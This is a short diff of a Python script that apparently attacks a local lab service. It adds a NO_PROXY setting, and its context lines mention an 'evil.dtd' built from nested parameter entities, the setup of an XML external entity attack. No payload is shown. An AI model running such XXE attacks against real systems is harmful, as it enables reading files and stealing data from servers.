@@ -19,6 +19,8 @@ import sys
 import base64
 import requests
 
+os.environ["NO_PROXY"] = "*"  # 防止代理污染：脚本只访问 127.0.0.1
+
 TARGET = os.environ.get("GKD_URL") or ("http://127.0.0.1:34936")
 
 # evil.dtd —— 参数实体三段套
